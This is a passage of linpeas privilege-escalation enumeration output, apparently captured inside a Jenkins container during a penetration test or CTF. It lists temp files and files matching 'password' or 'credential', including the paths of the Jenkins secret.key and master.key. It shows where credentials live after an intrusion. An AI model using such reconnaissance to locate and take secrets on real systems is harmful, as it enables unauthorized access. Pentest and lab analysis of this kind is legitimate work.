-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/credentials-binding/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/lockable-resources/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/jquery-detached/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/ldap/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/build-timeout/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/ssh-slaves/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/echarts-api/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/pipeline-stage-view/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/pipeline-model-extensions/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Aug  3  2020 /var/jenkins_home/plugins/matrix-auth/.timestamp2
-rw-r--r-- 1 jenkins jenkins 0 Jul 28  2020 /var/jenkins_home/war/.timestamp
-rw-r--r-- 1 jenkins jenkins 0 Oct  4 21:08 /var/jenkins_home/.lastStarted
-rw------- 1 root root 0 Jan 30  2020 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 May 15  2017 /etc/skel/.bash_logout

[1;34m╔══════════╣ [1;32mReadable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
[0m-rw------- 1 jenkins jenkins 32768 Oct  4 22:12 /tmp/hsperfdata_jenkins/6
-rw-r--r-- 1 jenkins jenkins 3167976 Aug  3  2020 /tmp/winstone7166027169177973699.jar
-rw-r--r-- 1 jenkins jenkins 3167976 Oct  4 21:08 /tmp/winstone8425575122115965411.jar
-rw-r--r-- 1 jenkins jenkins 104196 Oct  4 22:12 /tmp/linpeas.log
-rw-r--r-- 1 jenkins jenkins 3167976 Aug  3  2020 /tmp/winstone4805797399595250733.jar
-rwxr-xr-x 1 jenkins jenkins 848317 Aug 27 04:28 /tmp/linpeas.sh

[1;34m╔══════════╣ [1;32mSearching *password* or *credential* files in home (limit 70)
[0m/etc/pam.d/common-[1;31mpassword[0m
/usr/lib/git-core/git-[1;31mcredential[0m
/usr/lib/git-core/git-[1;31mcredential[0m-cache
/usr/lib/git-core/git-[1;31mcredential[0m-cache--daemon
/usr/lib/git-core/git-[1;31mcredential[0m-store
  #)[3mThere are more creds/passwds files in the previous parent folder[0m

/usr/local/openjdk-8/jre/lib/management/jmxremote.[1;31mpassword[0m.template
/usr/local/openjdk-8/sample/jmx/jmx-scandir/src/etc/[1;31mpassword[0m.properties
/usr/share/doc/git/contrib/[1;31mcredential[0m
/usr/share/doc/git/contrib/[1;31mcredential[0m/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/[1;31mcredential[0m/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/[1;31mcredential[0m/netrc/git-credential-netrc
/usr/share/doc/git/contrib/[1;31mcredential[0m/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/[1;31mcredential[0m/wincred/git-credential-wincred.c
/usr/share/man/man1/git-[1;31mcredential[0m-cache--daemon.1.gz
/usr/share/man/man1/git-[1;31mcredential[0m-cache.1.gz
/usr/share/man/man1/git-[1;31mcredential[0m-store.1.gz
/usr/share/man/man1/git-[1;31mcredential[0m.1.gz
  #)[3mThere are more creds/passwds files in the previous parent folder[0m

/usr/share/pam/common-[1;31mpassword[0m
/usr/share/pam/common-[1;31mpassword[0m.md5sums
/var/cache/debconf/[1;31mpassword[0ms.dat
/var/jenkins_home/plugins/[1;31mcredential[0ms
/var/jenkins_home/plugins/[1;31mcredential[0ms-binding
/var/jenkins_home/plugins/[1;31mcredential[0ms-binding.jpi
/var/jenkins_home/plugins/[1;31mcredential[0ms-binding/META-INF/maven/org.jenkins-ci.plugins/credentials-binding
/var/jenkins_home/plugins/[1;31mcredential[0ms-binding/WEB-INF/lib/credentials-binding.jar
/var/jenkins_home/plugins/[1;31mcredential[0ms.jpi
/var/jenkins_home/plugins/[1;31mcredential[0ms/META-INF/maven/org.jenkins-ci.plugins/credentials
/var/jenkins_home/plugins/[1;31mcredential[0ms/WEB-INF/lib/credentials.jar
/var/jenkins_home/plugins/[1;31mcredential[0ms/images/16x16/credential.png
/var/jenkins_home/plugins/[1;31mcredential[0ms/images/16x16/credentials.png
/var/jenkins_home/plugins/[1;31mcredential[0ms/images/16x16/new-credential.png
/var/jenkins_home/plugins/[1;31mcredential[0ms/images/24x24/credential.png
/var/jenkins_home/plugins/[1;31mcredential[0ms/images/24x24/credentials.png
/var/jenkins_home/plugins/[1;31mcredential[0ms/images/24x24/new-credential.png
/var/jenkins_home/plugins/[1;31mcredential[0ms/images/32x32/credential.png
/var/jenkins_home/plugins/[1;31mcredential[0ms/images/32x32/credentials.png
/var/jenkins_home/plugins/[1;31mcredential[0ms/images/32x32/new-credential.png
/var/jenkins_home/plugins/[1;31mcredential[0ms/images/48x48/credential.png
/var/jenkins_home/plugins/[1;31mcredential[0ms/images/48x48/credentials.png
/var/jenkins_home/plugins/[1;31mcredential[0ms/images/48x48/new-credential.png
/var/jenkins_home/plugins/plain-[1;31mcredential[0ms
/var/jenkins_home/plugins/plain-[1;31mcredential[0ms.jpi
/var/jenkins_home/plugins/plain-[1;31mcredential[0ms/META-INF/maven/org.jenkins-ci.plugins/plain-credentials
/var/jenkins_home/plugins/plain-[1;31mcredential[0ms/WEB-INF/lib/plain-credentials.jar
/var/jenkins_home/plugins/ssh-[1;31mcredential[0ms
/var/jenkins_home/plugins/ssh-[1;31mcredential[0ms.jpi
/var/jenkins_home/plugins/ssh-[1;31mcredential[0ms/META-INF/maven/org.jenkins-ci.plugins/ssh-credentials
/var/jenkins_home/plugins/ssh-[1;31mcredential[0ms/WEB-INF/lib/ssh-credentials.jar
/var/jenkins_home/secret.key
/var/jenkins_home/secrets/master.key
/var/lib/pam/[1;31mpassword[0m

[1;34m╔══════════╣ [1;32mChecking for TTY (sudo/su) passwords in audit logs
[0m
[1;34m╔══════════╣ [1;32mSearching passwords inside logs (limit 70)
[0m


[1;34m                                ╔════════════════╗
════════════════════════════════╣ [1;32mAPI Keys Regex[1;34m ╠════════════════════════════════
[1;34m                                ╚════════════════╝[0m
Regexes to search for API keys aren't activated, use param '-r' 


